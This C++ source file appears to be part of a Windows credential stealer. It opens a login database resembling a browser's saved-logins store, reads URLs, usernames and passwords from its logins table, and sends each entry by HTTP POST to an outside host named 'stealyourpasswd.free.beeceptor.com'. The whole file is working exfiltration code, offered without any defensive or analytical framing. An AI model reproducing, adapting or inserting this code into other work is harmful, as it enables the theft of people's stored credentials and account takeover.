#include "Sender.h"

string Sender::url = "stealyourpasswd.free.beeceptor.com";
HINTERNET Sender::hConnect = NULL;

//send all login info at dbPath to the specified server
void Sender::sendPasswords(string dbPath)
{
	HINTERNET hSession = WinHttpOpen(L"Program of Frost", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession)
	{
		cout << "Can't start http session";
		exit(GetLastError());
	}

	Sender::hConnect = WinHttpConnect(hSession, L"stealyourpasswd.free.beeceptor.com", INTERNET_DEFAULT_HTTP_PORT, 0);
	if (!hConnect)
	{
		cout << "Can't establish a connection to the server";
		exit(GetLastError());
	}
	Sender::readPasswords(dbPath);

}

void Sender::readPasswords(string dbPath)
{
	sqlite3* db;
	//read the database contains login data
	if (sqlite3_open(dbPath.c_str(), &db))
	{
		cerr << "Error: Can't open database\n";
		exit(sqlite3_errcode(db));
	}

	string query = "SELECT url, username, password FROM logins LIMIT 3";
	char* error;
	if (sqlite3_exec(db, query.c_str(), Sender::sqlCallback, db, &error) != SQLITE_OK)
	{
		cout << "SQLITE3 error: " << error << endl;
		exit(0x69);
	}
}

int Sender::sqlCallback(void* notUsed, int argc, char** argv, char** azColName)
{
	int status = Sender::sendData(argv[0], argv[1], argv[2]);
	if (status)
	{
		clog << "Error sending data of url:" << argv[0] << endl << "Error code: " << status << endl;
	}
	Sleep(1500);
	return 0;
}

int Sender::sendData(string url, string username, string passwords)
{
	HINTERNET hSession = WinHttpOpen(L"Program of Frost", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) return GetLastError();
	HINTERNET hConnect = WinHttpConnect(hSession, L"stealyourpasswd.free.beeceptor.com", INTERNET_DEFAULT_HTTP_PORT, 0);	//can't perfomr https requests yet
	if (!hConnect) return GetLastError();
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	if (!hRequest) return GetLastError();
	string param = "url=" + url + "&username=" + username + "&password=" + passwords;
	bool bresult = WinHttpSendRequest(hRequest, L"content-type:application/x-www-form-urlencoded", -1, (LPSTR)param.c_str(), param.length(), param.length(), 0);
	if (!bresult) return GetLastError();
	return 0;
}